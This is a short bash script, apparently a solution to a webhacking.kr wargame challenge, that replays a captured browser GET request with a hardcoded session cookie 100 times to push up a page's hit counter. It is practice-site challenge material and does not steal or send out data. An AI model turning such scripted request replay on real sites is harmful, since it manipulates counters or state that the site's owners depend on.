#!/bin/bash

c=1
while [ $c -le 100 ]
do
    curl -i -s -k  -X $'GET' \
    -H $'Host: webhacking.kr' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H $'Referer: http://webhacking.kr/challenge/codeing/code5.html' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9,ko;q=0.8' -H $'Cookie:  PHPSESSID=1f2df9a71e78841959b0656b05a2cadb' -H $'Connection: close' \
    -b $'PHPSESSID=1f2df9a71e78841959b0656b05a2cadb' \
    $'http://webhacking.kr/challenge/codeing/code5.html?hit=matta'

    ((c++))
done

